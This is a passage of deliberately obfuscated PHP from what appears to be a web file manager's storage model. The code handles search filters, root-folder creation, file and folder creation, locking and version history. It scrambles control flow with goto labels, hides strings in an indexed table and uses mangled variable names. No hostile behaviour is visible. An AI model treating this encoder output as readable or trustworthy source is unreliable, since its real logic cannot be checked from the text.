$d¬õòƒ§°Ü[$cûâàÖœ•Æ[84]] = array($d¬õòƒ§°Ü[$cûâàÖœ•Æ[84]], $e‚Õâ’èø„, $cûâàÖœ•Æ[1983]); } else { $d¬õòƒ§°Ü[$cûâàÖœ•Æ[84]] = $e‚Õâ’èø„; } } if (isset($E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[1975]]) && $E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[1975]] > 0) { $d¬õòƒ§°Ü[$cûâàÖœ•Æ[78]] = array($cûâàÖœ•Æ[1981], $E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[1975]]); } if (isset($E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[1976]]) && $E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[1976]]) { $e‚Õâ’èø„ = array($cûâàÖœ•Æ[1982], $E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[1976]]); if ($d¬õòƒ§°Ü[$cûâàÖœ•Æ[78]]) { $d¬õòƒ§°Ü[$cûâàÖœ•Æ[78]] = array($d¬õòƒ§°Ü[$cûâàÖœ•Æ[78]], $e‚Õâ’èø„, $cûâàÖœ•Æ[1983]); } else { $d¬õòƒ§°Ü[$cûâàÖœ•Æ[78]] = $e‚Õâ’èø„; } } goto C†´åê∏≥ÿ; FÜπ∞…≈“©: $cûâàÖœ•Æ =& $_SERVER[’ÿƒ†ïò]; $d¬õòƒ§°Ü = array(); if (isset($E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[749]]) && $E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[749]]) { $d¬õòƒ§°Ü[$cûâàÖœ•Æ[84]] = array($cûâàÖœ•Æ[1981], $E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[749]]); } goto cÉΩˆÉÕ–ñ; d’ñ´÷ùäâ: if (isset($E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[1814]]) && trim($E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[1814]])) { $Aç£‚ç€ì© = trim($E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[1814]]); $b‡Ìêã∂´Ï = explode($cûâàÖœ•Æ[50], $Aç£‚ç€ì©); if (strlen($Aç£‚ç€ì©) > 2 && (substr($Aç£‚ç€ì©, 0, 1) == $cûâàÖœ•Æ[116] && substr($Aç£‚ç€ì©, -1) == $cûâàÖœ•Æ[116]) || substr($Aç£‚ç€ì©, 0, 1) == $cûâàÖœ•Æ[55] && substr($Aç£‚ç€ì©, -1) == $cûâàÖœ•Æ[55]) { $Aç£‚ç€ì© = substr($Aç£‚ç€ì©, 1, -1); $b‡Ìêã∂´Ï = array($Aç£‚ç€ì©); } $d¬õòƒ§°Ü[$cûâàÖœ•Æ[28]] = array(array($cûâàÖœ•Æ[538], $cûâàÖœ•Æ[1816] . $Aç£‚ç€ì© . $cûâàÖœ•Æ[1816])); if (count($b‡Ìêã∂´Ï) > 1) { $d¬õòƒ§°Ü[$cûâàÖœ•Æ[28]] = array(); foreach ($b‡Ìêã∂´Ï as $CÀÌ¥ú§î) { if (!trim($CÀÌ¥ú§î)) { continue; } $d¬õòƒ§°Ü[$cûâàÖœ•Æ[28]][] = array($cûâàÖœ•Æ[538], $cûâàÖœ•Æ[1816] . trim($CÀÌ¥ú§î) . $cûâàÖœ•Æ[1816]); } } } return $d¬õòƒ§°Ü; goto B√àÒÇ ¶°; B√àÒÇ ¶°: } private function _parseSearchParent($B¯∑œûë◊‘, &$FÃÚ·™ùçœ) { goto C≥Ï¶„´‰Ÿ; Aè«Ç∞âè§: $DƒµüéøàŒ = isset($B¯∑œûë◊‘[$Eı≤‹‹Î∆›[1682]]) && in_array($Eı≤‹‹Î∆›[509], $B¯∑œûë◊‘[$Eı≤‹‹Î∆›[1682]]); if (!$DƒµüéøàŒ || !$c§∫Óæüúä || !$fèç√«°‡„ || !$e›®¬úâ∏ç[$Eı≤‹‹Î∆›[408]]) { return; } if (!AuthModel::authCheckRoot($e›®¬úâ∏ç[$Eı≤‹‹Î∆›[408]][$Eı≤‹‹Î∆›[409]])) { return; } goto Aöıå¶∫€Ö; b≥ª©§ÊÎå: $FÃÚ·™ùçœ[$Eı≤‹‹Î∆›[578]][] = $Eı≤‹‹Î∆›[1818]; goto E∑ÉÆÁÕÑõ; C≥Ï¶„´‰Ÿ: $Eı≤‹‹Î∆› =& $_SERVER[’ÿƒ†ïò]; if (!isset($B¯∑œûë◊‘[$Eı≤‹‹Î∆›[492]]) || !$B¯∑œûë◊‘[$Eı≤‹‹Î∆›[492]]) { return; } $e›®¬úâ∏ç = $this->pathInfo($B¯∑œûë◊‘[$Eı≤‹‹Î∆›[492]]); goto dá¿Ë¢›ò≥; E¶ìù„Û¨¯: $D±‘µŒ°Ÿº = count($böŸ˜…êÖ⁄); if ($D±‘µŒ°Ÿº <= 1) { return; } $EœÀÈãÙí„ = array($Eı≤‹‹Î∆›[492] => 0, $Eı≤‹‹Î∆›[406] => self::TYPE_GROUP, $Eı≤‹‹Î∆›[498] => array($Eı≤‹‹Î∆›[7], $böŸ˜…êÖ⁄)); goto bù≤ÑÉ˜ñõ; dá¿Ë¢›ò≥: $fèç√«°‡„ = $e›®¬úâ∏ç[$Eı≤‹‹Î∆›[492]] . $Eı≤‹‹Î∆›[33] === $Eı≤‹‹Î∆›[191]; $c§∫Óæüúä = $e›®¬úâ∏ç[$Eı≤‹‹Î∆›[406]] == $Eı≤‹‹Î∆›[509]; $FÃÚ·™ùçœ[$Eı≤‹‹Î∆›[578]] = array($Eı≤‹‹Î∆›[538], $e›®¬úâ∏ç[$Eı≤‹‹Î∆›[515]] . $B¯∑œûë◊‘[$Eı≤‹‹Î∆›[492]] . $Eı≤‹‹Î∆›[539]); goto Aè«Ç∞âè§; bù≤ÑÉ˜ñõ: $bâ€œ”ôΩú = $this->field($Eı≤‹‹Î∆›[1985])->where($EœÀÈãÙí„)->limit($D±‘µŒ°Ÿº)->select(); $FÃÚ·™ùçœ[$Eı≤‹‹Î∆›[578]] = array(); foreach ($bâ€œ”ôΩú as $f∫ÒêäùËÚ) { $FÃÚ·™ùçœ[$Eı≤‹‹Î∆›[578]][] = array($Eı≤‹‹Î∆›[538], $Eı≤‹‹Î∆›[525] . $f∫ÒêäùËÚ[$Eı≤‹‹Î∆›[397]] . $Eı≤‹‹Î∆›[539]); } goto b≥ª©§ÊÎå; Aöıå¶∫€Ö: $aØΩ§Ç©‹≈ = $e›®¬úâ∏ç[$Eı≤‹‹Î∆›[498]] . $Eı≤‹‹Î∆›[33]; if ($aØΩ§Ç©‹≈ == $Eı≤‹‹Î∆›[87]) { unset($FÃÚ·™ùçœ[$Eı≤‹‹Î∆›[578]]); $FÃÚ·™ùçœ[$Eı≤‹‹Î∆›[406]] = self::TYPE_GROUP; return; } $böŸ˜…êÖ⁄ = Model($Eı≤‹‹Î∆›[516])->groupChildrenAll($aØΩ§Ç©‹≈); goto E¶ìù„Û¨¯; E∑ÉÆÁÕÑõ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($dë√±∂Ïﬂû) { $Eﬂæˆè÷äﬁ =& $_SERVER[’ÿƒ†ïò]; $Fç”≈≥“Ãè = Model($Eﬂæˆè÷äﬁ[507])->where(array($Eﬂæˆè÷äﬁ[1548] => $dë√±∂Ïﬂû))->find(); $c≥æÇëÍæè = $this->_mkdirRoot(SourceModel::TYPE_USER, $dë√±∂Ïﬂû, $Fç”≈≥“Ãè[$Eﬂæˆè÷äﬁ[28]]); $this->userDesktopAdd($c≥æÇëÍæè); return $c≥æÇëÍæè; } public function userDesktopAdd($CÀ‡Ó∑ê¯Ü) { $EËÀﬁ≈ê–á =& $_SERVER[’ÿƒ†ïò]; $E–∂µäãåö = LNG($EËÀﬁ≈ê–á[1986]); $d◊≠±º°è· = $this->mkdir($CÀ‡Ó∑ê¯Ü, $E–∂µäãåö); $this->metaSet($d◊≠±º°è·, $EËÀﬁ≈ê–á[1987], $EËÀﬁ≈ê–á[87]); $this->metaSet($CÀ‡Ó∑ê¯Ü, $EËÀﬁ≈ê–á[1988], $d◊≠±º°è·); } public function groupRootAdd($EéÀÈ¬Üóî) { $EÀÉ†‚äèï =& $_SERVER[’ÿƒ†ïò]; $Aë¶¢«Ù⁄à = Model($EÀÉ†‚äèï[516])->where(array($EÀÉ†‚äèï[1810] => $EéÀÈ¬Üóî))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $EéÀÈ¬Üóî, $Aë¶¢«Ù⁄à[$EÀÉ†‚äèï[28]]); } public function systemRootPathAdd($aìË‰¯˜‚∂) { if ($aìË‰¯˜‚∂ != $_SERVER[’ÿƒ†ïò][531]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $aìË‰¯˜‚∂); } public function userRootRemove($CÃì…Âä˜„) { $c¿∫ã¿‹†§ = $this->sourceRoot(SourceModel::TYPE_USER, $CÃì…Âä˜„); if (!$c¿∫ã¿‹†§) { return; } $this->remove($c¿∫ã¿‹†§, !1); } public function groupRootRemove($DÉêßΩîÀä) { $cÜäÎ‚–◊› = $this->sourceRoot(SourceModel::TYPE_GROUP, $DÉêßΩîÀä); if (!$cÜäÎ‚–◊›) { return; } $this->remove($cÜäÎ‚–◊›, !1); } private function _mkdirRoot($cÎÂÀ“√¶Ú, $E¬“ΩõË¡≤, $d¯Ö´∂—ƒã) { goto bı“Í·ˆ€é; Fù‡¯ªóÃ: $bÍ£∫ œÂ = $this->add($bäÉ»πÇæå); $Dä∆ø”ÜˆÃ = array($FØÕÌ∞èÜ∆[580] => short_id($bÍ£∫ œÂ)); $this->where(array($FØÕÌ∞èÜ∆[412] => $bÍ£∫ œÂ))->save($Dä∆ø”ÜˆÃ); goto c± •òŸ◊¶; bı“Í·ˆ€é: $FØÕÌ∞èÜ∆ =& $_SERVER[’ÿƒ†ïò]; $bäÉ»πÇæå = array($FØÕÌ∞èÜ∆[396] => 0, $FØÕÌ∞èÜ∆[574] => $cÎÂÀ“√¶Ú, $FØÕÌ∞èÜ∆[575] => $E¬“ΩõË¡≤, $FØÕÌ∞èÜ∆[571] => 1, $FØÕÌ∞èÜ∆[576] => USER_ID, $FØÕÌ∞èÜ∆[577] => USER_ID, $FØÕÌ∞èÜ∆[572] => $FØÕÌ∞èÜ∆[33], $FØÕÌ∞èÜ∆[578] => $FØÕÌ∞èÜ∆[525], $FØÕÌ∞èÜ∆[424] => 0, $FØÕÌ∞èÜ∆[573] => 0, $FØÕÌ∞èÜ∆[462] => 0, $FØÕÌ∞èÜ∆[579] => $FØÕÌ∞èÜ∆[33]); if ($e√íÔ˜•øØ = $this->where($bäÉ»πÇæå)->find()) { return $e√íÔ˜•øØ[$FØÕÌ∞èÜ∆[397]]; } goto E∫¯∑É•€±; E∫¯∑É•€±: $dªêﬁ”ø¨Ç = "\x4d\157\x64\145\154\x53\157\165\162\143\145\56\x6d\x6b\x64\x69\162\122\157\x6f\164\x2e{$cÎÂÀ“√¶Ú}\x2e{$E¬“ΩõË¡≤}\x2e" . $d¯Ö´∂—ƒã; CacheLock::lock($dªêﬁ”ø¨Ç); $bäÉ»πÇæå[$FØÕÌ∞èÜ∆[28]] = $d¯Ö´∂—ƒã; goto Fù‡¯ªóÃ; c± •òŸ◊¶: CacheLock::unlock($dªêﬁ”ø¨Ç); return $bÍ£∫ œÂ; goto f∆∞åÙ‘§á; f∆∞åÙ‘§á: } private function sourceRoot($bÇ‚◊à≠Ë€, $C≤ï∏œÙ√⁄, $AÒπÿáê«ª = false) { $D·à£¯ãó‚ =& $_SERVER[’ÿƒ†ïò]; $fº¥ππ“—€ = array($D·à£¯ãó‚[396] => 0, $D·à£¯ãó‚[574] => $bÇ‚◊à≠Ë€, $D·à£¯ãó‚[575] => $C≤ï∏œÙ√⁄); if ($C‰Ñâ≈√ú¢ = $this->where($fº¥ππ“—€)->find()) { return $AÒπÿáê«ª ? $C‰Ñâ≈√ú¢ : $C‰Ñâ≈√ú¢[$D·à£¯ãó‚[397]]; } return !1; } public function sourceRootGroup($Eâƒ±„ç∏„) { goto E¨Ÿã°∑åí; BªºŸ◊ªÙ≠: $this->selectPageReset(); $Aˆ·úäÔ¿° = $this->limit(count($Eâƒ±„ç∏„))->listSource($e˘∏ΩÍ™¬—, 1000); $this->selectPageRestore(); goto Eóõ ó‚é±; E¨Ÿã°∑åí: $a ıâÇú¥˘ =& $_SERVER[’ÿƒ†ïò]; if (is_string($Eâƒ±„ç∏„)) { $Eâƒ±„ç∏„ = array($Eâƒ±„ç∏„); } $e˘∏ΩÍ™¬— = array($a ıâÇú¥˘[396] => 0, $a ıâÇú¥˘[575] => array($a ıâÇú¥˘[7], $Eâƒ±„ç∏„), $a ıâÇú¥˘[574] => SourceModel::TYPE_GROUP); goto BªºŸ◊ªÙ≠; Eóõ ó‚é±: return array_to_keyvalue($Aˆ·úäÔ¿°[$a ıâÇú¥˘[75]], $a ıâÇú¥˘[498]); goto bçøõøÇ™ò; bçøõøÇ™ò: } public function mkfile($DºõéÇàì¿, $f‘í√∆õÍÎ, $FÌÆ¨≤å¨ò = '', $EÙ˘ö⁄ëïÕ = REPEAT_RENAME) { $aƒƒµÀæüª =& $_SERVER[’ÿƒ†ïò]; $aÌóãµéá– = Model($aƒƒµÀæüª[597])->addFileByContent($FÌÆ¨≤å¨ò, $f‘í√∆õÍÎ); return $this->_createFileCall($DºõéÇàì¿, $f‘í√∆õÍÎ, $aÌóãµéá–, $EÙ˘ö⁄ëïÕ, $aƒƒµÀæüª[1244]); } public function addFile($Dƒ€¡Çß±, $D≠á≤àõ∏¯, $Bè’òÇõ„Ò, $DÑ≈áÙ”å“ = false, $déö—™äÎá = REPEAT_RENAME) { $D´’ôºè∆¶ = Model($_SERVER[’ÿƒ†ïò][597])->addFile($D≠á≤àõ∏¯, $Bè’òÇõ„Ò, $DÑ≈áÙ”å“); return $this->_createFileCall($Dƒ€¡Çß±, $Bè’òÇõ„Ò, $D´’ôºè∆¶, $déö—™äÎá); } public function addFileByFileID($aÛÌ≤¡∑å·, $e⁄≥ÙÙ¢„Ê, $d«üæä©èç, $d¢í€òçΩÈ = REPEAT_RENAME) { $B√≠ëìÑ∆¡ =& $_SERVER[’ÿƒ†ïò]; $Dª”ä∆‰ø∞ = Model($B√≠ëìÑ∆¡[597])->find($e⁄≥ÙÙ¢„Ê); Model($B√≠ëìÑ∆¡[597])->linkAdd($e⁄≥ÙÙ¢„Ê); return $this->_createFileCall($aÛÌ≤¡∑å·, $d«üæä©èç, $Dª”ä∆‰ø∞, $d¢í€òçΩÈ); } public function addFileByRemote($fî‚ÉÜÓ§ª, $A÷åç‚«Éœ, $dŸéÜ°π√ï, $fÉœ€í´»Û = array(), $BÇµ Ãﬂπè = REPEAT_RENAME) { $Fù⁄√‰áºê = Model($_SERVER[’ÿƒ†ïò][597])->addFileByRemote($A÷åç‚«Éœ, $dŸéÜ°π√ï, $fÉœ€í´»Û); return $this->_createFileCall($fî‚ÉÜÓ§ª, $dŸéÜ°π√ï, $Fù⁄√‰áºê, $BÇµ Ãﬂπè); } private function _createFileCall($fıÜ¿Îûô¡, $E‰¬èÒ˘π—, $aøúÑÁæÀù, $a¥´üÿëÑ—, $dé¥è«ÊÒœ = "\x75\x70\154\x6f\x61\144") { goto b≤Ã£πãéé; b≤Ã£πãéé: $Bπ–É÷¬Íñ =& $_SERVER[’ÿƒ†ïò]; $fßúˆñÑÍ˜ = !1; $this->setMasterDB(); goto C≈Õıû∂¢ò; C≈Õıû∂¢ò: $this->lockWriteStart($fıÜ¿Îûô¡, $E‰¬èÒ˘π—); $CäüÜáÚáá = $this->fileNameExist($fıÜ¿Îûô¡, $E‰¬èÒ˘π—); $fœÕÎÂõÀ„ = $this->_createFile($fıÜ¿Îûô¡, $E‰¬èÒ˘π—, $aøúÑÁæÀù, $a¥´üÿëÑ—, $fßúˆñÑÍ˜); goto b®∞ãä∞„ ; b®∞ãä∞„ : if (!$fßúˆñÑÍ˜) { Model($Bπ–É÷¬Íñ[464])->remove($aøúÑÁæÀù[$Bπ–É÷¬Íñ[461]]); } if ($fßúˆñÑÍ˜ && $fœÕÎÂõÀ„ && $fœÕÎÂõÀ„ != $CäüÜáÚáá) { Model($Bπ–É÷¬Íñ[1959])->eventCreate($fœÕÎÂõÀ„, $dé¥è«ÊÒœ); } $this->lockWriteEnd($fıÜ¿Îûô¡, $E‰¬èÒ˘π—); goto Cúàˆ≥€é«; Cúàˆ≥€é«: return $fœÕÎÂõÀ„; goto DÇÇ»–ﬂä; DÇÇ»–ﬂä: } public function mkdir($A„¯·∑º¡ä, $DïÖÈ’ÂΩ«, $B≥ÖóÌú¥§ = REPEAT_SKIP) { goto E¥õõæëÓÉ; E¥õõæëÓÉ: $e∞‡òÛÚœû =& $_SERVER[’ÿƒ†ïò]; $this->setMasterDB(); $f∏¯¨†‡Íü = $this->sourceInfo($A„¯·∑º¡ä); goto Cã—±ıœÙ´; Bﬁöìö÷ÊŒ: $this->lockWriteEnd($A„¯·∑º¡ä, $DïÖÈ’ÂΩ«); return $cÑ‡ûıÍéÂ; goto a’⁄òî®∆’; d·„˘™’éâ: $EÉÀ¡‹¶àﬁ = array($e∞‡òÛÚœû[571] => 1, $e∞‡òÛÚœû[415] => $DïÖÈ’ÂΩ«, $e∞‡òÛÚœû[572] => $e∞‡òÛÚœû[33], $e∞‡òÛÚœû[462] => 0, $e∞‡òÛÚœû[573] => 0); $cÑ‡ûıÍéÂ = $this->_addSoure($EÉÀ¡‹¶àﬁ, $f∏¯¨†‡Íü); Model($e∞‡òÛÚœû[1959])->eventCreate($cÑ‡ûıÍéÂ, $e∞‡òÛÚœû[1245]); goto Bﬁöìö÷ÊŒ; Cã—±ıœÙ´: if (!$f∏¯¨†‡Íü) { return !1; } $this->lockWriteStart($A„¯·∑º¡ä, $DïÖÈ’ÂΩ«); if ($B≥ÖóÌú¥§ !== !1) { $b´œ◊ﬁ∑—ë = $this->fileNameExist($A„¯·∑º¡ä, $DïÖÈ’ÂΩ«); if ($b´œ◊ﬁ∑—ë && $B≥ÖóÌú¥§ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($A„¯·∑º¡ä, $DïÖÈ’ÂΩ«); return $b´œ◊ﬁ∑—ë; } $DïÖÈ’ÂΩ« = $this->fileNameAuto($A„¯·∑º¡ä, $DïÖÈ’ÂΩ«, $B≥ÖóÌú¥§); } goto d·„˘™’éâ; a’⁄òî®∆’: } private function _createFile($bÇÏÎà€õ∂, $f≠Ñ∂ªÎÂ≤, $E÷Ü›»Ü¥•, $C’É©ßäµ–, &$d¡ôﬂçêÂ∏) { goto bÕÿäÔÀ‡Ø; bÕÿäÔÀ‡Ø: $fŸâãŸ∞èº =& $_SERVER[’ÿƒ†ïò]; $E¨ÿàœﬁÏˆ = $this->sourceInfo($bÇÏÎà€õ∂); if (!$E÷Ü›»Ü¥• || !$E¨ÿàœﬁÏˆ) { return !1; } goto bì≤êﬁÇ≤∑; c∂Îñ…÷™ä: return $C°ºÎﬁÉøè; goto e“ﬁÕ”ÏÃè; då≈â≥ÒíÛ: $aïèﬁæ™¢º = array($fŸâãŸ∞èº[571] => 0, $fŸâãŸ∞èº[415] => $f≠Ñ∂ªÎÂ≤, $fŸâãŸ∞èº[572] => substr(get_path_ext($f≠Ñ∂ªÎÂ≤), 0, 10), $fŸâãŸ∞èº[462] => $E÷Ü›»Ü¥•[$fŸâãŸ∞èº[461]], $fŸâãŸ∞èº[573] => $E÷Ü›»Ü¥•[$fŸâãŸ∞èº[78]]); $C°ºÎﬁÉøè = $this->_addSoure($aïèﬁæ™¢º, $E¨ÿàœﬁÏˆ); $this->folderSizeReset($bÇÏÎà€õ∂, intval($aïèﬁæ™¢º[$fŸâãŸ∞èº[78]])); goto c∂Îñ…÷™ä; bì≤êﬁÇ≤∑: if ($C’É©ßäµ– !== !1) { $cúÊµª§ﬂ— = $this->fileNameExist($bÇÏÎà€õ∂, $f≠Ñ∂ªÎÂ≤); } $d¡ôﬂçêÂ∏ = !0; if ($C’É©ßäµ– && $cúÊµª§ﬂ—) { if ($C’É©ßäµ– == REPEAT_SKIP) { $d¡ôﬂçêÂ∏ = !1; return $cúÊµª§ﬂ—; } else { if ($C’É©ßäµ– == REPEAT_REPLACE) { $F∞óãÉ”À™ = $this->sourceInfo($cúÊµª§ﬂ—); $e—éÎè˘È› = $this->fileHistory($F∞óãÉ”À™, $E÷Ü›»Ü¥•[$fŸâãŸ∞èº[461]], $E÷Ü›»Ü¥•[$fŸâãŸ∞èº[78]]); if (!$e—éÎè˘È›) { $d¡ôﬂçêÂ∏ = !1; } else { $this->folderSizeReset($bÇÏÎà€õ∂); } return $cúÊµª§ﬂ—; } else { $f≠Ñ∂ªÎÂ≤ = $this->fileNameAuto($bÇÏÎà€õ∂, $f≠Ñ∂ªÎÂ≤, $C’É©ßäµ–, !1); } } } goto då≈â≥ÒíÛ; e“ﬁÕ”ÏÃè: } protected function fileHistory($b°Ãá∞Á¯ó, $D√π÷•πûÉ, $Fé‘ôπ∫ì ) { goto d∑ñ∞Ω¡†∏; cÚËãØ⁄ı≠: $this->where(array($A›∫”∏¿ê´[412] => $b°Ãá∞Á¯ó[$A›∫”∏¿ê´[397]]))->save($bÈëÀ€ÂÜ•); $this->sourceCacheClear($b°Ãá∞Á¯ó[$A›∫”∏¿ê´[397]]); return !0; goto d›Òïíß¬ã; d∑ñ∞Ω¡†∏: $A›∫”∏¿ê´ =& $_SERVER[’ÿƒ†ïò]; $D´ÀÜ≠íﬂß = defined($A›∫”∏¿ê´[468]) ? USER_ID : $A›∫”∏¿ê´[191]; if ($b°Ãá∞Á¯ó[$A›∫”∏¿ê´[461]] == $D√π÷•πûÉ) { return !1; } goto cú∞ƒÓ≥Ï±; cú∞ƒÓ≥Ï±: $this->checkLock($b°Ãá∞Á¯ó[$A›∫”∏¿ê´[397]], $D√π÷•πûÉ); Model($A›∫”∏¿ê´[1989])->addHistory($b°Ãá∞Á¯ó); $bÈëÀ€ÂÜ• = array($A›∫”∏¿ê´[577] => $D´ÀÜ≠íﬂß, $A›∫”∏¿ê´[419] => time(), $A›∫”∏¿ê´[461] => $D√π÷•πûÉ, $A›∫”∏¿ê´[78] => $Fé‘ôπ∫ì ); goto cÚËãØ⁄ı≠; d›Òïíß¬ã: } public function checkLock($eˆÆ∆‹œÏ, $D·ˆÖÿèÿ€) { goto f¡¡çå¢©ö; a√ô©Õé©Ø: $bΩã†Ñ£É´ = Session::get($E≈‚ƒ⁄–Àä[1990]); $cßŸó≈•Ì‚ = substr($aﬂç‚±Œ‡Ï[$E≈‚ƒ⁄–Àä[28]], 0, -1 - strlen($aﬂç‚±Œ‡Ï[$E≈‚ƒ⁄–Àä[168]])) . $E≈‚ƒ⁄–Àä[1509] . $bΩã†Ñ£É´ . $E≈‚ƒ⁄–Àä[95] . $aﬂç‚±Œ‡Ï[$E≈‚ƒ⁄–Àä[168]]; $EÎ¿®‡ﬁÉ = Model($E≈‚ƒ⁄–Àä[597])->find($D·ˆÖÿèÿ€); goto DﬁÖ⁄∞Ñ± ; DﬁÖ⁄∞Ñ± : $this->_createFileCall($aﬂç‚±Œ‡Ï[$E≈‚ƒ⁄–Àä[492]], $cßŸó≈•Ì‚, $EÎ¿®‡ﬁÉ, REPEAT_REPLACE, $E≈‚ƒ⁄–Àä[1244]); $Fæ—Ü»êàÓ = $aﬂç‚±Œ‡Ï[$E≈‚ƒ⁄–Àä[459]][$E≈‚ƒ⁄–Àä[536]]; $a¥Úó»›ñã = $Fæ—Ü»êàÓ[$E≈‚ƒ⁄–Àä[1991]] ? $Fæ—Ü»êàÓ[$E≈‚ƒ⁄–Àä[1991]] : $Fæ—Ü»êàÓ[$E≈‚ƒ⁄–Àä[28]]; goto A—…œ∏≈æé; f¡¡çå¢©ö: $E≈‚ƒ⁄–Àä =& $_SERVER[’ÿƒ†ïò]; $aﬂç‚±Œ‡Ï = $this->pathInfo($eˆÆ∆‹œÏ); if (!$this->fileIsLock($aﬂç‚±Œ‡Ï, !0)) { return; } goto a√ô©Õé©Ø; A—…œ∏≈æé: show_json(LNG($E≈‚ƒ⁄–Àä[1992]) . $E≈‚ƒ⁄–Àä[1993] . LNG($E≈‚ƒ⁄–Àä[1994]) . $E≈‚ƒ⁄–Àä[1995] . $a¥Úó»›ñã . $E≈‚ƒ⁄–Àä[1996], !1); goto e√€ªı≥˜·; e√€ªı≥˜·: } public function fileIsLock($a•ÎÊÒú˜º, $CúÙááâ†œ = false) { goto e¡€££Óèê; e¡€££Óèê: $A∞Üâ≠†¥Á =& $_SERVER[’ÿƒ†ïò]; if (!isset($a•ÎÊÒú˜º[$A∞Üâ≠†¥Á[459]]) || !$a•ÎÊÒú˜º[$A∞Üâ≠†¥Á[459]][$A∞Üâ≠†¥Á[533]]) { return !1; } if ($a•ÎÊÒú˜º[$A∞Üâ≠†¥Á[459]][$A∞Üâ≠†¥Á[533]] != USER_ID) { return !0; } goto e¿í∫ëﬂìè; b‹¡âã√∫∑: return !1; goto C∏ü˜‘„é°; e¿í∫ëﬂìè: $b†æ¬∞ÑÃπ = $GLOBALS[$A∞Üâ≠†¥Á[6]][$A∞Üâ≠†¥Á[88]][$A∞Üâ≠†¥Á[534]]; if ($a•ÎÊÒú˜º[$A∞Üâ≠†¥Á[459]][$A∞Üâ≠†¥Á[535]] <= time() - $b†æ¬∞ÑÃπ) { $this->metaSet($a•ÎÊÒú˜º[$A∞Üâ≠†¥Á[397]], $A∞Üâ≠†¥Á[533], null); $this->metaSet($a•ÎÊÒú˜º[$A∞Üâ≠†¥Á[397]], $A∞Üâ≠†¥Á[535], null); } if ($CúÙááâ†œ) { $this->metaSet($a•ÎÊÒú˜º[$A∞Üâ≠†¥Á[397]], $A∞Üâ≠†¥Á[535], time()); } goto b‹¡âã√∫∑; C∏ü˜‘„é°: } private function _addSoure($cú≥é∆ÁÏ—, $Dª“©Úëé«) { goto e∫—Ñëè˜ã; b∞ÛﬁΩœïã: $fıß¬≥◊ô° = $this->add($cú≥é∆ÁÏ—); $AÑÖ∫˜∆«· = array($Cä≠√ª©±¢[580] => short_id($fıß¬≥◊ô°)); $this->where(array($Cä≠√ª©±¢[412] => $fıß¬≥◊ô°))->save($AÑÖ∫˜∆«·); goto f©û€ÌöÔÁ; AÑêÌ‰àﬂ„: $cú≥é∆ÁÏ— = array_merge($B∂âë≤¿ÿº, $cú≥é∆ÁÏ—); $this->updateModifyTime($cú≥é∆ÁÏ—[$Cä≠√ª©±¢[492]]); $e—≤êÌœÑ÷ = $Cä≠√ª©±¢[1997] . $Dª“©Úëé«[$Cä≠√ª©±¢[397]]; goto F∫É∑∞âÿ€; F∫É∑∞âÿ€: if (isset(self::$cacheChildList[$e—≤êÌœÑ÷])) { unset(self::$cacheChildList[$e—≤êÌœÑ÷]); } static $c˜Ù⁄∫‚ØØ = false; if (!$c˜Ù⁄∫‚ØØ) { Hook::trigger($Cä≠√ª©±¢[561], $cú≥é∆ÁÏ—); $c˜Ù⁄∫‚ØØ = !0; } goto b∞ÛﬁΩœïã; e∫—Ñëè˜ã: $Cä≠√ª©±¢ =& $_SERVER[’ÿƒ†ïò]; $eˆ›´≈éåÜ = defined($Cä≠√ª©±¢[468]) ? USER_ID : $Cä≠√ª©±¢[191]; $B∂âë≤¿ÿº = array($Cä≠√ª©±¢[574] => $Dª“©Úëé«[$Cä≠√ª©±¢[406]], $Cä≠√ª©±¢[575] => $Dª“©Úëé«[$Cä≠√ª©±¢[498]], $Cä≠√ª©±¢[576] => $eˆ›´≈éåÜ, $Cä≠√ª©±¢[577] => $eˆ›´≈éåÜ, $Cä≠√ª©±¢[396] => $Dª“©Úëé«[$Cä≠√ª©±¢[397]], $Cä≠√ª©±¢[578] => $Dª“©Úëé«[$Cä≠√ª©±¢[515]] . $Dª“©Úëé«[$Cä≠√ª©±¢[397]] . $Cä≠√ª©±¢[47], $Cä≠√ª©±¢[424] => 0, $Cä≠√ª©±¢[579] => $Cä≠√ª©±¢[33]); goto AÑêÌ‰àﬂ„; f©û€ÌöÔÁ: $this->setNamePinyin($fıß¬≥◊ô°, $cú≥é∆ÁÏ—[$Cä≠√ª©±¢[28]]); return $fıß¬≥◊ô°; goto c◊£Î¬›Î¢; c◊£Î¬›Î¢: } public function remove($eàº¥¨™ ç, $CÏîƒù·¯† = true) { goto cﬁ≠ﬂÿÑ⁄°; aå›é»÷Ç·: CacheLock::lock($a¯ùâÊËã∞); $fß√«¯Ùè± = $this->fileNameExist($fŒöõ≤›èÉ, $b˜¯ßäõ’∫); if (!$fß√«¯Ùè±) { $fß√«¯Ùè± = $this->mkdir($fŒöõ≤›èÉ, $b˜¯ßäõ’∫, REPEAT_SKIP); $this->metaSet($fß√«¯Ùè±, $CÜêíàõ£∑[2002], $c™Ñ›Ìåø£); $this->metaSet($fß√«¯Ùè±, $CÜêíàõ£∑[2003], $fø˘ºä—¥[$CÜêíàõ£∑[498]]); if ($fø˘ºä—¥[$CÜêíàõ£∑[492]] != 0) { $this->metaSet($fß√«¯Ùè±, $CÜêíàõ£∑[2004], _get($bå°•îÖ¶Ü, $CÜêíàõ£∑[2005])); } } goto C…Í∂∏Ç»ß; C…Í∂∏Ç»ß: CacheLock::unlock($a¯ùâÊËã∞); $this->metaSet($eàº¥¨™ ç, $CÜêíàõ£∑[2006], $fø˘ºä—¥[$CÜêíàõ£∑[492]]); $this->where(array($CÜêíàõ£∑[397] => $eàº¥¨™ ç))->save(array($CÜêíàõ£∑[419] => time())); goto dõÿà«òàá; eßà≈ãå≠: $AØö—ÌáÈÛ = 